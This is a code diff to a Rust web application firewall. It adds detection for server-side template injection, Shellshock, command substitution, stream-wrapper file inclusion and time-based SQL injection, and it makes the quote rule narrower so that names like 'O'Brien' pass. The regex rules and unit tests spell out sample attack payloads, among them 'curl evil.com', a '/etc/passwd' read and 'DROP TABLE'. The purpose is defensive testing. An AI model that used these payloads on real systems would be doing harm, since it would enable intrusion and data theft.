@@ -20,6 +20,8 @@ pub struct WafRules {
     lfi_rfi_set: RegexSet,
     /// OS command injection and NoSQL operator patterns.
     cmd_injection_set: RegexSet,
+    /// Server-Side Template Injection probes.
+    ssti_set: RegexSet,
     /// Known malicious scanner and bot User-Agent signatures.
     bot_ua_set: RegexSet,
 }
@@ -36,8 +38,17 @@ impl WafRules {
             // Bounded repetitions prevent catastrophic backtracking on long payloads
             r"(?i)(union\s+select|select\s+.{0,256}?\s+from|insert\s+into|update\s+.{0,256}?\s+set|drop\s+table)",
             r#"(?i)(and|or)\s+[\d'"]+\s*=\s*[\d'"]+"#, // e.g. OR 1=1
-            r#"(?i)(\%27)|(')|(\-\-)|(\%23)|(#)"#,     // Basic quotes and comments
+            // Quote/comment injection. A *bare* apostrophe is not an attack —
+            // `O'Brien` and `l'hôtel` are ordinary user input — so the quote or
+            // comment must appear next to something that makes it a statement
+            // break: a boolean/DML keyword, a terminator, or a comment opener.
+            r#"(?i)'\s*(or|and|union|select|;)\b"#,
+            r#"(?i)'\s*(--|#|/\*)"#,
+            r#"(?i);\s*(drop|delete|insert|update|select|truncate|alter)\b"#,
+            r#"(?i)(--|/\*)\s*(or|and|union|select|drop|insert|update)\b"#,
             r"(?i)(exec\s+xp_cmdshell|information_schema|waitfor\s+delay)", // Advanced SQLi
+            // Time-based blind SQLi
+            r"(?i)\b(sleep|pg_sleep|benchmark)\s*\(",
         ];
 
         // OWASP Top 10 - XSS
@@ -52,13 +63,42 @@ impl WafRules {
             r"(?i)(\.\./|\.\.\\|%2e%2e%2f|%2e%2e/)", // Directory Traversal
             r"(?i)(/etc/passwd|/windows/win\.ini|/boot\.ini)", // LFI
             r"(?i)(http(s)?://.*(cmd=|include=))",   // Potential RFI
+            // Stream wrappers used to smuggle local files / code past a
+            // path check (`php://filter/...`, `phar://`, `data://text/plain`).
+            // http/https are deliberately absent — they are legitimate query
+            // values (redirect targets, callbacks) and are covered by the RFI
+            // pattern above.
+            r"(?i)\b(php|phar|data|expect|glob|zip|file)://",
         ];
 
         // OS Command Injection & NoSQL
         let cmd_injection_patterns = vec![
             r#"(?i)([;|&\`])\s*(cat|ls|pwd|whoami|id|curl|wget|nc|bash|sh)\b"#, // Command chain
             r"(?i)(\$|%24)\{.*\}",                                              // Env var expansion
+            // Command substitution `$(cmd)` — the `${...}` pattern above only
+            // covers brace expansion. Anchored to known binaries so ordinary
+            // values containing parentheses are not flagged.
+            r#"(?i)\$\(\s*(cat|ls|pwd|whoami|id|curl|wget|nc|bash|sh|uname|env)\b"#,
             r"(?i)(\$gt|\$lt|\$ne|\$in|\$nin)",                                 // NoSQL operators
+            // Shellshock (CVE-2014-6271): an exported function definition followed
+            // by a command, e.g. `() { :; }; echo vuln`. The `${...}` rule above
+            // does not cover it — there is no brace *expansion*, just a function
+            // body — so the payload walked straight through to the backend.
+            r"\(\s*\)\s*\{\s*[^;{}]{0,64};",
+        ];
+
+        // Server-Side Template Injection.
+        //
+        // Kept deliberately narrow. A bare `{{ … }}` is not an attack — it appears
+        // in legitimate values that carry template fragments — so a match needs
+        // either an arithmetic operator between the braces (the canonical `{{7*7}}`
+        // probe) or a known sandbox-escape attribute. `${…}` payloads are already
+        // covered by the command-injection set.
+        let ssti_patterns = vec![
+            r"\{\{\s*[^{}]{0,64}[*/%+-]\s*[^{}]{0,64}\}\}",
+            r"(?i)(__class__|__globals__|__subclasses__|__mro__|__builtins__)",
+            r"(?i)\{\{\s*(config|self|request|settings)\s*[.\[]",
+            r"(?i)<%=\s*[^%]{0,64}%>",
         ];
 
         // Malicious Scanners & Bots
@@ -70,6 +110,7 @@ impl WafRules {
             xss_set: RegexSet::new(&xss_patterns).unwrap(),
             lfi_rfi_set: RegexSet::new(&lfi_rfi_patterns).unwrap(),
             cmd_injection_set: RegexSet::new(&cmd_injection_patterns).unwrap(),
+            ssti_set: RegexSet::new(&ssti_patterns).unwrap(),
             bot_ua_set: RegexSet::new(&bot_ua_patterns).unwrap(),
         }
     }
@@ -88,6 +129,9 @@ impl WafRules {
         }
         if self.cmd_injection_set.is_match(payload) {
             return Some("OS Command / NoSQL Injection");
+        }
+        if self.ssti_set.is_match(payload) {
+            return Some("Server-Side Template Injection (SSTI)");
         }
         None
     }
@@ -124,6 +168,83 @@ mod tests {
 
         // Benign SQL-like string
         assert_eq!(rules.inspect_payload("?q=how+to+select+a+good+apple"), None); // Too generic, should pass
+    }
+
+    /// An apostrophe is ordinary text in names and in several languages. The
+    /// old rule flagged every `'`, `--` and `#`, so a signup form could not
+    /// accept "O'Brien".
+    #[test]
+    fn test_apostrophes_in_ordinary_text_are_not_sqli() {
+        let rules = WafRules::new();
+        for benign in [
+            "?name=O'Brien",
+            "?q=l'hôtel est là",
+            "?q=it's a test",
+            "?title=Rock'n'Roll",
+            "?q=dell'arte",
+            "?note=well--formatted",
+            "?tag=#hashtag",
+            "?q=the european union summit",
+            "?q=please select an option",
+        ] {
+            assert_eq!(rules.inspect_payload(benign), None, "false positive: {benign}");
+        }
+    }
+
+    /// Quote/comment sequences that *are* injections must still be caught.
+    #[test]
+    fn test_quote_injection_still_detected() {
+        let rules = WafRules::new();
+        for attack in [
+            "?u=admin'--",
+            "?u=admin' #",
+            "?id=1' OR '1'='1",
+            "?id=1' or 1=1",
+            "?id=1'; DROP TABLE users",
+            "?id=1'/*comment*/",
+        ] {
+            assert_eq!(
+                rules.inspect_payload(attack),
+                Some("SQL Injection (SQLi)"),
+                "missed: {attack}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_time_based_blind_sqli_detected() {
+        let rules = WafRules::new();
+        for attack in ["?id=1 AND SLEEP(5)", "?id=1;pg_sleep(10)", "?id=BENCHMARK(1000000,MD5(1))"] {
+            assert_eq!(
+                rules.inspect_payload(attack),
+                Some("SQL Injection (SQLi)"),
+                "missed: {attack}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_stream_wrapper_lfi_detected() {
+        let rules = WafRules::new();
+        assert!(rules
+            .inspect_payload("?f=php://filter/convert.base64-encode/resource=index")
+            .is_some());
+        assert!(rules.inspect_payload("?f=phar://evil.phar").is_some());
+        assert!(rules.inspect_payload("?f=data://text/plain;base64,PD9waHA=").is_some());
+        // Ordinary absolute URLs stay allowed — they are legitimate query values.
+        assert_eq!(
+            rules.inspect_payload("?redirect=https://example.com/next"),
+            None
+        );
+    }
+
+    #[test]
+    fn test_command_substitution_detected() {
+        let rules = WafRules::new();
+        assert!(rules.inspect_payload("?c=$(whoami)").is_some());
+        assert!(rules.inspect_payload("?c=$( cat /etc/hosts)").is_some());
+        // Parentheses on their own are not an attack.
+        assert_eq!(rules.inspect_payload("?q=total (approx)"), None);
     }
 
     #[test]
@@ -227,5 +348,62 @@ mod tests {
             "ReDoS: unbounded.* caused {}ms eval on 5KB payload",
             elapsed.as_millis()
         );
+    }
+
+    /// Shellshock (CVE-2014-6271). The exported-function payload has no brace
+    /// *expansion*, so the `${...}` command-injection rule never matched it and
+    /// the request reached the backend untouched.
+    #[test]
+    fn test_shellshock_detected() {
+        let rules = WafRules::new();
+        for payload in [
+            "?q=() { :; }; echo vuln",
+            "?q=() {:;}; /bin/cat /etc/passwd",
+            "() { ignored; }; curl evil.com",
+        ] {
+            assert!(
+                rules.inspect_payload(payload).is_some(),
+                "shellshock payload not detected: {}",
+                payload
+            );
+        }
+    }
+
+    /// SSTI probes, and the ordinary values the narrow rules must not flag.
+    #[test]
+    fn test_ssti_detected() {
+        let rules = WafRules::new();
+        for payload in [
+            "?q={{7*7}}",
+            "?q={{ 7 * 7 }}",
+            "?q={{config.items()}}",
+            "?q={{''.__class__.__mro__}}",
+            "?tpl=<%= 7*7 %>",
+        ] {
+            assert_eq!(
+                rules.inspect_payload(payload),
+                Some("Server-Side Template Injection (SSTI)"),
+                "SSTI payload not detected: {}",
+                payload
+            );
+        }
+    }
+
+    #[test]
+    fn test_ordinary_braces_are_not_ssti() {
+        let rules = WafRules::new();
+        for payload in [
+            "?q={\"a\":1}",
+            "?tpl={{name}}",
+            "?q={{ user }}",
+            "?msg=set {} to the empty set",
+        ] {
+            assert_eq!(
+                rules.inspect_payload(payload),
+                None,
+                "false positive on ordinary value: {}",
+                payload
+            );
+        }
     }
 }
